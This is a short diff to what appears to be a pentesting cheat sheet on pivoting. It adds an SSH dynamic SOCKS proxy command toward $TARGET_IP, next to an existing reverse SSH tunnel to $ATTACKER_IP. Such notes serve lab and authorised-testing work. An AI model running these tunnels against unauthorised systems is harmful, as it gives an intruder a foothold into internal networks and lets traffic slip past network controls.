@@ -25,6 +25,13 @@ then on remote machine
 ```bash
 ssh -N -R $REMOTE_PORT:localhost:$PORT $USER@$ATTACKER_IP
 ```
+
+Proxy on localhost:9090 using SSH and credentials:
+```bash
+#socks5, localhost:9090 in FoxyProxy
+ssh -D 9090 $USER@$TARGET_IP
+```
+
 Forward local port to target IP with SOCAT
 ---
 ```bash
